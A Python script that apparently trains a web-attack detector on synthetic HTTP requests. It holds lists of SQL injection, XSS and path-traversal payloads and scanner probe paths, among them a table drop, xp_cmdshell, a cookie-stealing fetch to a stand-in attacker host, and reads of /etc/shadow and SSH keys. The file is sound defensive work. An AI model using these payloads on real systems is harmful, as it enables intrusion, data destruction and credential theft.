"""Phase 3 trainer.

Generates synthetic labeled data, trains an IsolationForest (anomaly) and
an XGBClassifier (known-attack), and persists everything the inference
service needs under model/:

    isolation_forest.pkl    iso_threshold.json
    xgb_classifier.pkl      feature_importances.json
    scaler.pkl              test_set.npz
    metadata.json
"""
from __future__ import annotations

import argparse
import json
import random
import string
import time
from dataclasses import dataclass
from pathlib import Path

import joblib
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.metrics import (
    classification_report,
    confusion_matrix,
    f1_score,
    precision_score,
    recall_score,
    roc_auc_score,
)
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from xgboost import XGBClassifier

from feature_extractor import FEATURE_NAMES, FeatureExtractor

MODEL_DIR = Path(__file__).parent / "model"
MODEL_DIR.mkdir(parents=True, exist_ok=True)

RNG_SEED = 42
random.seed(RNG_SEED)
np.random.seed(RNG_SEED)


# =========================================================================
# Synthetic data generation
# =========================================================================

@dataclass
class Sample:
    method: str
    uri: str
    headers: dict[str, str]
    body: str
    client_ip: str
    label: int  # 0 normal, 1 attack
    family: str  # "normal", "sqli", "xss", "traversal", "scanner"


BENIGN_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/products/{id}",
    "/api/v1/users", "/api/v1/users/{id}", "/api/v1/orders", "/api/v1/orders/{id}",
    "/static/css/main.css", "/static/js/app.js", "/images/logo.png",
    "/blog", "/blog/{slug}", "/search", "/login", "/logout", "/signup",
    "/cart", "/checkout", "/account", "/account/settings",
]

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "PostmanRuntime/7.35.0",
    "curl/8.4.0",
]

SCANNER_USER_AGENTS = [
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)",
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Nessus SOAP",
    "masscan/1.3",
    "ZmEu",
    "WPScan v3.8.22",
    "Wfuzz/3.1.0",
    "gobuster/3.6",
    "dirbuster",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' UNION SELECT username,password FROM users --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "admin'--",
    "1; DROP TABLE users; --",
    "' UNION SELECT NULL,NULL,NULL --",
    "1' OR SLEEP(5) --",
    "'; EXEC xp_cmdshell('dir'); --",
    "1 UNION SELECT @@version --",
    "' OR 'x'='x",
    "1' AND 1=CONVERT(int,(SELECT @@version)) --",
    "%27%20UNION%20SELECT%201%2C2%2C3--",
    "id=1' OR '1'='1' /*",
    "user=admin'-- &pass=x",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "\"><script>eval(atob('YWxlcnQoMSk='))</script>",
    "<iframe src=javascript:alert(1)>",
    "<a href='javascript:alert(1)'>click</a>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<input onfocus=alert(1) autofocus>",
    "'\"><img src=x onerror=alert(1)>",
    "<script>fetch('//attacker/?c='+document.cookie)</script>",
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "../../../../../../windows/win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../proc/self/environ",
    "../../../../../root/.ssh/id_rsa",
    "/var/www/../../etc/passwd",
    "%00../../../etc/passwd",
]

SCANNER_PROBE_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/wp-login.php", "/wp-admin/",
    "/phpmyadmin/", "/admin/", "/administrator/", "/server-status",
    "/.aws/credentials", "/.svn/entries", "/web.config", "/robots.txt",
    "/sitemap.xml", "/_ignition/health-check", "/actuator/health",
    "/console/", "/manager/html",
]


def _rand_ip(rng: random.Random) -> str:
    return ".".join(str(rng.randint(1, 254)) for _ in range(4))


def _rand_query(rng: random.Random, n: int = 2) -> str:
    parts = []
    for _ in range(rng.randint(0, n)):
        k = "".join(rng.choices(string.ascii_lowercase, k=rng.randint(2, 6)))
        v = "".join(rng.choices(string.ascii_letters + string.digits, k=rng.randint(1, 10)))
        parts.append(f"{k}={v}")
    return ("?" + "&".join(parts)) if parts else ""


def _fill_path(rng: random.Random, p: str) -> str:
    return p.replace("{id}", str(rng.randint(1, 9999))).replace(
        "{slug}", "".join(rng.choices(string.ascii_lowercase, k=rng.randint(4, 12)))
    )


class DataGenerator:
    def __init__(self, seed: int = RNG_SEED) -> None:
        self.rng = random.Random(seed)

    def _benign_headers(self, content_type: str | None = None) -> dict[str, str]:
        h = {
            "Host": "example.com",
            "User-Agent": self.rng.choice(BENIGN_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }
        if content_type:
            h["Content-Type"] = content_type
        if self.rng.random() < 0.5:
            h["Referer"] = "https://example.com" + self.rng.choice(BENIGN_PATHS).replace("{id}", "1").replace("{slug}", "post")
        if self.rng.random() < 0.3:
            h["Cookie"] = f"session={''.join(self.rng.choices(string.ascii_letters + string.digits, k=24))}"
        return h

    def normal(self, n: int) -> list[Sample]:
        out: list[Sample] = []
        for _ in range(n):
            method = self.rng.choices(["GET", "POST", "PUT", "DELETE"], weights=[7, 2, 0.5, 0.5])[0]
            path = _fill_path(self.rng, self.rng.choice(BENIGN_PATHS))
            uri = path + _rand_query(self.rng)
            body = ""
            ct = None
            if method in ("POST", "PUT"):
                if self.rng.random() < 0.6:
                    ct = "application/json"
                    body = json.dumps({
                        "name": "".join(self.rng.choices(string.ascii_letters, k=self.rng.randint(3, 10))),
                        "qty": self.rng.randint(1, 100),
                    })
                else:
                    ct = "application/x-www-form-urlencoded"
                    body = f"name={''.join(self.rng.choices(string.ascii_letters, k=6))}&qty={self.rng.randint(1, 100)}"
            out.append(Sample(
                method=method, uri=uri, headers=self._benign_headers(ct),
                body=body, client_ip=_rand_ip(self.rng), label=0, family="normal",
            ))
        return out

    def minimal_benign(self, n: int) -> list[Sample]:
        """Plain GET requests with 0-2 headers — health checks, favicons, etc.

        Counterweight to the bias where benign samples always carry 5+ headers,
        which made XGBoost treat header_count ≤ 2 as an attack signal.
        """
        out: list[Sample] = []
        paths = ["/", "/health", "/ping", "/api/status",
                 "/favicon.ico", "/robots.txt", "/index.html"]
        keys = ["Host", "Accept", "User-Agent"]
        for _ in range(n):
            uri = self.rng.choice(paths)
            k = self.rng.randint(0, 2)
            chosen = self.rng.sample(keys, k)
            headers: dict[str, str] = {}
            for key in chosen:
                if key == "Host":
                    headers["Host"] = "example.com"
                elif key == "Accept":
                    headers["Accept"] = "*/*"
                elif key == "User-Agent":
                    headers["User-Agent"] = self.rng.choice(BENIGN_USER_AGENTS)
            out.append(Sample(
                method="GET", uri=uri, headers=headers,
                body="", client_ip=_rand_ip(self.rng), label=0, family="normal",
            ))
        return out

    def script_benign(self, n: int) -> list[Sample]:
        """Benign automation traffic (curl, requests, wget) — 1-3 headers."""
        out: list[Sample] = []
        uas = ["curl/7.88.1", "python-requests/2.31.0",
               "Go-http-client/1.1", "wget/1.21.3"]
        paths = ["/api/v1/health", "/metrics", "/status"]
        for _ in range(n):
            ua = self.rng.choice(uas)
            uri = self.rng.choice(paths)
            headers: dict[str, str] = {"Host": "example.com"}
            total = self.rng.randint(1, 3)
            if total >= 2:
                headers["User-Agent"] = ua
            if total >= 3:
                headers["Accept"] = "*/*"
            out.append(Sample(
                method="GET", uri=uri, headers=headers,
                body="", client_ip=_rand_ip(self.rng), label=0, family="normal",
            ))
        return out

    def sqli(self, n: int) -> list[Sample]:
        out: list[Sample] = []
        for _ in range(n):
            payload = self.rng.choice(SQLI_PAYLOADS)
            in_body = self.rng.random() < 0.4
            base = _fill_path(self.rng, self.rng.choice(BENIGN_PATHS))
            if in_body:
                uri = base
                body = f"id={payload}" if self.rng.random() < 0.5 else json.dumps({"q": payload})
                ct = "application/x-www-form-urlencoded" if "id=" in body else "application/json"
                method = "POST"
            else:
                uri = f"{base}?id={payload}"
                body = ""
                ct = None
                method = "GET"
            out.append(Sample(
                method=method, uri=uri, headers=self._benign_headers(ct),
                body=body, client_ip=_rand_ip(self.rng), label=1, family="sqli",
            ))
        return out

    def xss(self, n: int) -> list[Sample]:
        out: list[Sample] = []
        for _ in range(n):
            payload = self.rng.choice(XSS_PAYLOADS)
            in_body = self.rng.random() < 0.5
            base = _fill_path(self.rng, self.rng.choice(BENIGN_PATHS))
            if in_body:
                uri = base
                body = json.dumps({"comment": payload})
                ct = "application/json"
                method = "POST"
            else:
                uri = f"{base}?q={payload}"
                body = ""
                ct = None
                method = "GET"
            out.append(Sample(
                method=method, uri=uri, headers=self._benign_headers(ct),
                body=body, client_ip=_rand_ip(self.rng), label=1, family="xss",
            ))
        return out

    def traversal(self, n: int) -> list[Sample]:
        out: list[Sample] = []
        for _ in range(n):
            payload = self.rng.choice(TRAVERSAL_PAYLOADS)
            uri = self.rng.choice([
                f"/download?file={payload}",
                f"/static/{payload}",
                f"/api/v1/files/{payload}",
                f"/include.php?page={payload}",
            ])
            out.append(Sample(
                method="GET", uri=uri, headers=self._benign_headers(),
                body="", client_ip=_rand_ip(self.rng), label=1, family="traversal",
            ))
        return out

    def scanner(self, n: int) -> list[Sample]:
        out: list[Sample] = []
        for _ in range(n):
            ua = self.rng.choice(SCANNER_USER_AGENTS)
            path = self.rng.choice(SCANNER_PROBE_PATHS)
            uri = path + (_rand_query(self.rng, 1) if self.rng.random() < 0.3 else "")
            headers = {
                "Host": "example.com",
                "User-Agent": ua,
                "Accept": "*/*",
            }
            out.append(Sample(
                method="GET", uri=uri, headers=headers,
                body="", client_ip=_rand_ip(self.rng), label=1, family="scanner",
            ))
        return out

    def generate(
        self,
        n_normal: int = 5000,
        n_sqli: int = 1000,
        n_xss: int = 500,
        n_path: int = 500,
        n_scan: int = 300,
    ) -> list[Sample]:
        samples: list[Sample] = []
        samples += self.normal(n_normal)
        samples += self.minimal_benign(300)
        samples += self.script_benign(200)
        samples += self.sqli(n_sqli)
        samples += self.xss(n_xss)
        samples += self.traversal(n_path)
        samples += self.scanner(n_scan)
        self.rng.shuffle(samples)
        return samples


# =========================================================================
# Training
# =========================================================================

def _vectorize(samples: list[Sample]) -> tuple[np.ndarray, np.ndarray, np.ndarray]:
    fe = FeatureExtractor()  # no redis — behavioral feats default to 0
    X = np.vstack([fe.extract({
        "method": s.method, "uri": s.uri, "headers": s.headers,
        "body": s.body, "client_ip": s.client_ip,
    }) for s in samples])
    y = np.array([s.label for s in samples], dtype=np.int64)
    fam = np.array([s.family for s in samples])
    return X, y, fam


def _iso_score(model: IsolationForest, X: np.ndarray) -> np.ndarray:
    # Higher = more anomalous. score_samples is higher = more normal, so negate.
    return -model.score_samples(X)


def _normalize_iso(scores: np.ndarray, ref: np.ndarray) -> np.ndarray:
    lo, hi = float(ref.min()), float(ref.max())
    if hi - lo < 1e-9:
        return np.zeros_like(scores)
    return np.clip((scores - lo) / (hi - lo), 0.0, 1.0)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--fast", action="store_true",
                        help="Smaller dataset + fewer trees — for CI smoke runs.")
    args = parser.parse_args()

    if args.fast:
        n_normal, n_sqli, n_xss, n_path, n_scan = 2000, 400, 200, 200, 200
        n_estimators_xgb = 50
        n_estimators_iso = 50
    else:
        n_normal, n_sqli, n_xss, n_path, n_scan = 5000, 1000, 500, 500, 300
        n_estimators_xgb = 300
        n_estimators_iso = 200

    t_start = time.time()
    print(f"[1/6] Generating synthetic dataset… (fast={args.fast})")
    gen = DataGenerator()
    samples = gen.generate(n_normal, n_sqli, n_xss, n_path, n_scan)
    print(f"      {len(samples)} samples "
          f"(normal/sqli/xss/traversal/scanner = "
          f"{n_normal}/{n_sqli}/{n_xss}/{n_path}/{n_scan})")

    print("[2/6] Extracting features…")
    X, y, fam = _vectorize(samples)
    print(f"      X shape = {X.shape}")

    # Stratified split so each family/label is represented in both sides.
    X_train, X_test, y_train, y_test, fam_train, fam_test = train_test_split(
        X, y, fam, test_size=0.2, random_state=RNG_SEED, stratify=y
    )

    print("[3/6] Fitting StandardScaler…")
    scaler = StandardScaler().fit(X_train)
    X_train_s = scaler.transform(X_train)
    X_test_s = scaler.transform(X_test)
    joblib.dump(scaler, MODEL_DIR / "scaler.pkl")

    # ---- IsolationForest: normal-only training -----------------------
    print("[4/6] Training IsolationForest (normal-only)…")
    normal_mask_train = y_train == 0
    iso = IsolationForest(
        n_estimators=n_estimators_iso, contamination=0.05, random_state=RNG_SEED, n_jobs=-1
    )
    iso.fit(X_train_s[normal_mask_train])
    joblib.dump(iso, MODEL_DIR / "isolation_forest.pkl")

    # Threshold tuning: choose threshold so FPR < 2% on held-out normal set
    normal_mask_test = y_test == 0
    iso_train_scores = _iso_score(iso, X_train_s[normal_mask_train])
    iso_test_scores_normal = _iso_score(iso, X_test_s[normal_mask_test])
    iso_test_scores_all = _iso_score(iso, X_test_s)

    # 98th percentile of normal-only test scores → FPR ~ 2%
    raw_threshold = float(np.quantile(iso_test_scores_normal, 0.98))
    iso_norm_scores_all = _normalize_iso(iso_test_scores_all, iso_train_scores)
    iso_norm_scores_normal = _normalize_iso(iso_test_scores_normal, iso_train_scores)
    norm_threshold = float(np.quantile(iso_norm_scores_normal, 0.98))

    iso_pred = (iso_norm_scores_all >= norm_threshold).astype(int)
    iso_p = precision_score(y_test, iso_pred, zero_division=0)
    iso_r = recall_score(y_test, iso_pred, zero_division=0)
    iso_f = f1_score(y_test, iso_pred, zero_division=0)
    fpr = float(((iso_pred == 1) & (y_test == 0)).sum() / max((y_test == 0).sum(), 1))
    print(f"      raw_threshold={raw_threshold:.4f}  norm_threshold={norm_threshold:.4f}")
    print(f"      IsolationForest  P={iso_p:.3f}  R={iso_r:.3f}  F1={iso_f:.3f}  FPR={fpr:.3%}")

    with open(MODEL_DIR / "iso_threshold.json", "w") as f:
        json.dump({
            "raw_threshold": raw_threshold,
            "normalized_threshold": norm_threshold,
            "score_min": float(iso_train_scores.min()),
            "score_max": float(iso_train_scores.max()),
            "target_fpr": 0.02,
            "achieved_fpr": fpr,
        }, f, indent=2)

    # ---- XGBoost: supervised ----------------------------------------
    print("[5/6] Training XGBClassifier…")
    xgb = XGBClassifier(
        n_estimators=n_estimators_xgb,
        max_depth=6,
        learning_rate=0.1,
        objective="binary:logistic",
        eval_metric="logloss",
        random_state=RNG_SEED,
        n_jobs=-1,
        tree_method="hist",
    )
    xgb.fit(X_train_s, y_train)
    joblib.dump(xgb, MODEL_DIR / "xgb_classifier.pkl")

    xgb_proba = xgb.predict_proba(X_test_s)[:, 1]
    xgb_pred = (xgb_proba >= 0.5).astype(int)
    xgb_p = precision_score(y_test, xgb_pred, zero_division=0)
    xgb_r = recall_score(y_test, xgb_pred, zero_division=0)
    xgb_f = f1_score(y_test, xgb_pred, zero_division=0)
    xgb_auc = roc_auc_score(y_test, xgb_proba)
    print(f"      XGBoost          P={xgb_p:.3f}  R={xgb_r:.3f}  F1={xgb_f:.3f}  AUC={xgb_auc:.3f}")
    print("\nXGBoost classification report:")
    print(classification_report(y_test, xgb_pred, target_names=["normal", "attack"]))
    print("Confusion matrix:")
    print(confusion_matrix(y_test, xgb_pred))

    importances = {
        name: float(score)
        for name, score in zip(FEATURE_NAMES, xgb.feature_importances_)
    }
    with open(MODEL_DIR / "feature_importances.json", "w") as f:
        json.dump(dict(sorted(importances.items(), key=lambda kv: -kv[1])), f, indent=2)

    # ---- Ensemble eval ----------------------------------------------
    print("[6/6] Ensemble evaluation…")
    ensemble = 0.4 * iso_norm_scores_all + 0.6 * xgb_proba
    ens_pred = (ensemble >= 0.5).astype(int)
    ens_p = precision_score(y_test, ens_pred, zero_division=0)
    ens_r = recall_score(y_test, ens_pred, zero_division=0)
    ens_f = f1_score(y_test, ens_pred, zero_division=0)
    ens_auc = roc_auc_score(y_test, ensemble)
    print(f"      Ensemble (0.4·iso + 0.6·xgb)  P={ens_p:.3f}  R={ens_r:.3f}  "
          f"F1={ens_f:.3f}  AUC={ens_auc:.3f}")

    # ---- Persist test set + metadata --------------------------------
    np.savez(
        MODEL_DIR / "test_set.npz",
        X_test=X_test, X_test_scaled=X_test_s, y_test=y_test, fam_test=fam_test,
    )
    with open(MODEL_DIR / "metadata.json", "w") as f:
        json.dump({
            "feature_names": FEATURE_NAMES,
            "feature_dim": len(FEATURE_NAMES),
            "n_samples": len(samples),
            "trained_at": int(time.time()),
            "elapsed_sec": round(time.time() - t_start, 2),
            "metrics": {
                "isolation_forest": {"precision": iso_p, "recall": iso_r, "f1": iso_f, "fpr": fpr},
                "xgboost": {"precision": xgb_p, "recall": xgb_r, "f1": xgb_f, "auc": xgb_auc},
                "ensemble": {"precision": ens_p, "recall": ens_r, "f1": ens_f, "auc": ens_auc},
            },
        }, f, indent=2)
    print(f"\nDone in {time.time() - t_start:.1f}s. Artifacts → {MODEL_DIR}")


if __name__ == "__main__":
    main()
